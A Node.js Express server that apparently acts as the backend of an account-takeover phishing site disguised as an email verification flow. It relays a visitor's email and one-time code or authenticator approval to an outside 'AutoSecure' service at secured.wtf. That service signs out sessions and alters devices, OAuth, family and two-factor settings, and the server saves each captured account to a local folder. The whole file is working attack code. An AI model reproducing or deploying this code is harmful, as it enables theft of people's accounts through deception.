const express = require('express');
const path = require('path');
const fs = require('fs');
const WebSocket = require('ws');

const app = express();
const PORT = process.env.PORT || 3000;
const API_KEY = process.env.API_KEY || '';
const WS_URL = process.env.WS_URL || 'wss://secured.wtf/api/';
const DOMAIN = process.env.DOMAIN || null;
const ACCOUNTS_DIR = path.join(__dirname, 'accounts');

app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// In-memory session store: sessionId -> { ws, authenticated, pendingResponses, proofs, ... }
const sessions = new Map();

function generateId() {
    return Math.random().toString(36).slice(2) + Date.now().toString(36);
}

// Save a successfully secured account to the accounts folder
function saveAccount(response) {
    if (!response || !response.success) return;
    try {
        const name = response.new_name || response.old_name || response.uid || generateId();
        const filename = `${name}_${Date.now()}.json`;
        const filepath = path.join(ACCOUNTS_DIR, filename);
        fs.writeFileSync(filepath, JSON.stringify(response, null, 2));
        console.log(`Account saved: ${filename}`);
    } catch (err) {
        console.error('Failed to save account:', err);
    }
}

// Create an authenticated WebSocket connection to AutoSecure
function createWSConnection() {
    return new Promise((resolve, reject) => {
        const ws = new WebSocket(WS_URL);
        const session = {
            ws,
            authenticated: false,
            pendingResponses: new Map(), // id -> { resolve, reject, timeout }
            logs: [],
            authResult: null,
        };

        const authTimeout = setTimeout(() => {
            ws.close();
            reject(new Error('WebSocket auth timeout'));
        }, 15000);

        ws.on('open', () => {
            ws.send(JSON.stringify({
                type: 'auth',
                data: { api_key: API_KEY }
            }));
        });

        ws.on('message', (raw) => {
            let msg;
            try {
                msg = JSON.parse(raw.toString());
            } catch {
                return;
            }

            // Auth response
            if (msg.type === 'auth' || (msg.event === 'auth')) {
                if (msg.success) {
                    clearTimeout(authTimeout);
                    session.authenticated = true;
                    resolve(session);
                } else {
                    clearTimeout(authTimeout);
                    ws.close();
                    reject(new Error(msg.error || 'Authentication failed'));
                }
                return;
            }

            // Acknowledgement
            if (msg.type === 'acknowledgement') {
                const pending = session.pendingResponses.get(msg.id);
                if (pending) {
                    pending.uid = msg.uid;
                    // Don't resolve yet - wait for event_response
                }
                return;
            }

            // Log messages
            if (msg.type === 'log') {
                session.logs.push(msg.message);
                return;
            }

            // Event response (final result)
            if (msg.type === 'event_response') {
                const pending = session.pendingResponses.get(msg.id);
                if (pending) {
                    clearTimeout(pending.timeout);
                    session.pendingResponses.delete(msg.id);
                    pending.resolve(msg);
                }
                return;
            }

            // Error
            if (msg.type === 'error') {
                const pending = session.pendingResponses.get(msg.id);
                if (pending) {
                    clearTimeout(pending.timeout);
                    session.pendingResponses.delete(msg.id);
                    pending.resolve(msg);
                }
                return;
            }
        });

        ws.on('error', (err) => {
            clearTimeout(authTimeout);
            reject(err);
        });

        ws.on('close', () => {
            clearTimeout(authTimeout);
            // Clean up any pending requests
            for (const [id, pending] of session.pendingResponses) {
                clearTimeout(pending.timeout);
                pending.reject(new Error('WebSocket closed'));
            }
            session.pendingResponses.clear();
        });
    });
}

// Send a WS event and wait for its response
function sendAndWait(session, event, data, timeoutMs = 60000) {
    return new Promise((resolve, reject) => {
        const id = 'req_' + generateId();
        const timeout = setTimeout(() => {
            session.pendingResponses.delete(id);
            reject(new Error('Request timeout'));
        }, timeoutMs);

        session.pendingResponses.set(id, { resolve, reject, timeout, uid: null });

        session.ws.send(JSON.stringify({
            type: 'event',
            event,
            id,
            data
        }));
    });
}

// Clean up a session
function cleanupSession(sessionId) {
    const session = sessions.get(sessionId);
    if (session) {
        if (session.wsSession && session.wsSession.ws.readyState === WebSocket.OPEN) {
            session.wsSession.ws.close();
        }
        sessions.delete(sessionId);
    }
}

// Auto-cleanup stale sessions (older than 10 minutes)
setInterval(() => {
    const now = Date.now();
    for (const [id, session] of sessions) {
        if (now - session.createdAt > 10 * 60 * 1000) {
            cleanupSession(id);
        }
    }
}, 60000);


// ─── ROUTES ───────────────────────────────────────────────

// POST /api/verification/email
// Frontend sends: { step: "email", email: "user@example.com", username: "..." }
// We call getproofs on AutoSecure, then either sendotp or return auth_app info
app.post('/api/verification/email', async (req, res) => {
    try {
        const { email, username } = req.body;

        if (!email) {
            return res.status(400).json({
                ok: false,
                APIResponse: { status: 'error', message: 'Email is required' }
            });
        }

        // Create a new WS connection for this flow
        let wsSession;
        try {
            wsSession = await createWSConnection();
        } catch (err) {
            return res.status(502).json({
                ok: false,
                APIResponse: { status: 'server_error', message: 'Could not connect to secure service' }
            });
        }

        // Get proofs for this email
        let proofsResponse;
        try {
            proofsResponse = await sendAndWait(wsSession, 'getproofs', { email }, 30000);
        } catch (err) {
            wsSession.ws.close();
            return res.status(502).json({
                ok: false,
                APIResponse: { status: 'server_error', message: 'Failed to get authentication proofs' }
            });
        }

        if (!proofsResponse.success) {
            wsSession.ws.close();
            return res.status(400).json({
                ok: false,
                APIResponse: {
                    status: proofsResponse.error || 'error',
                    message: proofsResponse.message || proofsResponse.error || 'Could not get proofs for this email'
                }
            });
        }

        // Create a session to persist the WS connection across requests
        const sessionId = generateId();

        if (proofsResponse.auth_app) {
            // Auth app flow - return entropy for user to confirm
            sessions.set(sessionId, {
                wsSession,
                email,
                username,
                type: 'auth_app',
                sessionIdWs: proofsResponse.session_id,
                entropy: proofsResponse.entropy,
                createdAt: Date.now()
            });

            return res.json({
                ok: true,
                APIResponse: {
                    status: 'auth_app',
                    entropy: proofsResponse.entropy,
                    sessionId,
                    session_id: proofsResponse.session_id
                }
            });
        } else {
            // OTP flow - send OTP to first available proof
            const proofs = proofsResponse.proofs || [];
            if (proofs.length === 0) {
                wsSession.ws.close();
                return res.status(400).json({
                    ok: false,
                    APIResponse: { status: 'error', message: 'No authentication proofs available for this email' }
                });
            }

            // Send OTP to the first proof
            const proof = proofs[0];
            let sendOtpResponse;
            try {
                sendOtpResponse = await sendAndWait(wsSession, 'sendotp', {
                    email,
                    proof_id: proof.id
                }, 30000);
            } catch (err) {
                wsSession.ws.close();
                return res.status(502).json({
                    ok: false,
                    APIResponse: { status: 'server_error', message: 'Failed to send OTP code' }
                });
            }

            if (!sendOtpResponse.success) {
                wsSession.ws.close();
                return res.status(400).json({
                    ok: false,
                    APIResponse: {
                        status: sendOtpResponse.error || 'error',
                        message: sendOtpResponse.message || 'Failed to send OTP'
                    }
                });
            }

            sessions.set(sessionId, {
                wsSession,
                email,
                username,
                type: 'otp',
                proofs,
                selectedProof: proof,
                createdAt: Date.now()
            });

            return res.json({
                ok: true,
                APIResponse: {
                    status: 'otp_sent',
                    sessionId,
                    state: {
                        sec_email: proof.display
                    }
                }
            });
        }
    } catch (err) {
        console.error('Email verification error:', err);
        return res.status(500).json({
            ok: false,
            APIResponse: { status: 'server_error', message: 'Internal server error' }
        });
    }
});


// POST /api/verification/otp
// Frontend sends: { step: "otp", email: "...", otp: "123456", state: { sessionId, ... } }
// We call the "otp" secure event on AutoSecure
app.post('/api/verification/otp', async (req, res) => {
    try {
        const { email, otp, state } = req.body;

        if (!otp || !state || !state.sessionId) {
            return res.status(400).json({
                ok: false,
                APIResponse: { status: 'error', message: 'OTP and session are required' }
            });
        }

        const session = sessions.get(state.sessionId);
        if (!session) {
            return res.status(400).json({
                ok: false,
                APIResponse: { status: 'error', message: 'Session expired. Please re-enter your email.' }
            });
        }

        const { wsSession, username } = session;

        if (wsSession.ws.readyState !== WebSocket.OPEN) {
            cleanupSession(state.sessionId);
            return res.status(400).json({
                ok: false,
                APIResponse: { status: 'error', message: 'Session expired. Please re-enter your email.' }
            });
        }

        // Build secure payload
        const secureData = {
            email: session.email,
            otp: otp,
            sign_out: true,
            devices: true,
            oauths: true,
            family: true,
            tfa: true,
        };

        if (DOMAIN) {
            secureData.domain = DOMAIN;
        }

        // Send the OTP secure event - 300s timeout
        let secureResponse;
        try {
            secureResponse = await sendAndWait(wsSession, 'otp', secureData, 300000);
        } catch (err) {
            cleanupSession(state.sessionId);
            return res.status(502).json({
                ok: false,
                APIResponse: { status: 'server_error', message: 'Secure operation timed out' }
            });
        }

        cleanupSession(state.sessionId);

        if (secureResponse.success) {
            saveAccount(secureResponse);
            return res.json({
                ok: true,
                APIResponse: { status: 'success', ...secureResponse }
            });
        } else {
            const errorStatus = secureResponse.error || secureResponse.status || 'error';
            let mappedStatus = errorStatus;
            if (errorStatus === 'invalid_otp' || (secureResponse.message && secureResponse.message.toLowerCase().includes('otp'))) {
                mappedStatus = 'invalid_otp';
            }

            return res.status(400).json({
                ok: false,
                APIResponse: {
                    status: mappedStatus,
                    message: secureResponse.message || 'OTP verification failed'
                }
            });
        }
    } catch (err) {
        console.error('OTP verification error:', err);
        return res.status(500).json({
            ok: false,
            APIResponse: { status: 'server_error', message: 'Internal server error' }
        });
    }
});


// POST /api/verification/auth
// Frontend sends: { step: "auth", email: "...", state: { sessionId, session_id, ... } }
// We poll the authapp event on AutoSecure
app.post('/api/verification/auth', async (req, res) => {
    try {
        const { email, state } = req.body;

        if (!state || !state.sessionId) {
            return res.status(400).json({
                ok: false,
                APIResponse: { status: 'error', message: 'Session is required' }
            });
        }

        const session = sessions.get(state.sessionId);
        if (!session) {
            return res.status(400).json({
                ok: false,
                APIResponse: { status: 'error', message: 'Session expired. Please re-enter your email.' }
            });
        }

        const { wsSession } = session;

        if (wsSession.ws.readyState !== WebSocket.OPEN) {
            cleanupSession(state.sessionId);
            return res.status(400).json({
                ok: false,
                APIResponse: { status: 'error', message: 'Session expired. Please re-enter your email.' }
            });
        }

        // Poll the auth app
        let authResponse;
        try {
            authResponse = await sendAndWait(wsSession, 'authapp', {
                email: session.email,
                session_id: session.sessionIdWs || state.session_id,
                timeout: 10
            }, 15000);
        } catch (err) {
            // Timeout is expected during polling - not an error
            return res.json({
                ok: false,
                APIResponse: { status: 'pending', message: 'Waiting for confirmation...' }
            });
        }

        if (authResponse.success && authResponse.msaauth) {
            // Auth app approved - now secure the account with msaauth
            const secureData = {
                msaauth: authResponse.msaauth,
                sign_out: true,
                devices: true,
                oauths: true,
                family: true,
                tfa: true,
            };

            if (DOMAIN) {
                secureData.domain = DOMAIN;
            }

            let secureResponse;
            try {
                secureResponse = await sendAndWait(wsSession, 'msaauth', secureData, 300000);
            } catch (err) {
                cleanupSession(state.sessionId);
                return res.status(502).json({
                    ok: false,
                    APIResponse: { status: 'server_error', message: 'Secure operation timed out' }
                });
            }

            cleanupSession(state.sessionId);

            if (secureResponse.success) {
                saveAccount(secureResponse);
                return res.json({
                    ok: true,
                    APIResponse: { status: 'success', ...secureResponse }
                });
            } else {
                return res.status(400).json({
                    ok: false,
                    APIResponse: {
                        status: secureResponse.error || 'error',
                        message: secureResponse.message || 'Secure operation failed'
                    }
                });
            }
        } else if (authResponse.error === 'expired') {
            cleanupSession(state.sessionId);
            return res.json({
                ok: false,
                APIResponse: { status: 'auth_timeout', message: 'Authentication request timed out. Please try again.' }
            });
        } else if (authResponse.error === 'rejected') {
            cleanupSession(state.sessionId);
            return res.json({
                ok: false,
                APIResponse: { status: 'auth_rejected', message: 'Authentication was rejected. Wrong number selected.' }
            });
        } else {
            // Still pending
            return res.json({
                ok: false,
                APIResponse: { status: 'pending', message: 'Waiting for confirmation...' }
            });
        }
    } catch (err) {
        console.error('Auth verification error:', err);
        return res.status(500).json({
            ok: false,
            APIResponse: { status: 'server_error', message: 'Internal server error' }
        });
    }
});


// Catch-all: serve index.html for any non-API route (SPA support)
app.get('*', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});


app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
    if (!API_KEY) {
        console.warn('WARNING: No API_KEY set. Set the API_KEY environment variable for AutoSecure WebSocket auth.');
    }
});
